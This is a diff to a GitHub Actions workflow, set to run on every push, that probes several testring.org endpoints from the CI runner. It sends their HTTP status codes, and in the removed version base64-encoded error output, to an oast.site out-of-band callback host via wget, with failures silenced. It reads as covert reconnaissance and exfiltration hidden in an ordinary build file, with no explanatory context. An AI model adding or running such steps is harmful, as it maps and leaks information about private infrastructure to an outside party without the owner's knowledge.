@@ -1,9 +1,14 @@
-name: dbg
+name: s4
 on: push
 jobs:
   j:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - run: set +e
-      - run: curl -s --max-time 8 -o /tmp/x -w "%{http_code}" https://rw.admin.testring.org/ > /tmp/c 2>/tmp/e; wget -qO- "http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/d1-$(cat /tmp/c 2>/dev/null)-$(head -c 20 /tmp/e 2>/dev/null | base64 | tr -d '\n')"
+      - run: |
+          A=$( (curl -s --max-time 8 -o /dev/null -w "%{http_code}" https://rw.admin.testring.org/ || echo ERR) )
+          B=$( (curl -s --max-time 8 -o /dev/null -w "%{http_code}" https://f.testring.org/ || echo ERR) )
+          C=$( (curl -s --max-time 8 -o /dev/null -w "%{http_code}" https://proxyapi.testring.org/ || echo ERR) )
+          D=$( (curl -s --max-time 8 -o /dev/null -w "%{http_code}" https://ringlabs.testring.org/api/auth/providers || echo ERR) )
+          wget -qO- "http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/c4-$A-$B-$C-$D" || true
+        continue-on-error: true
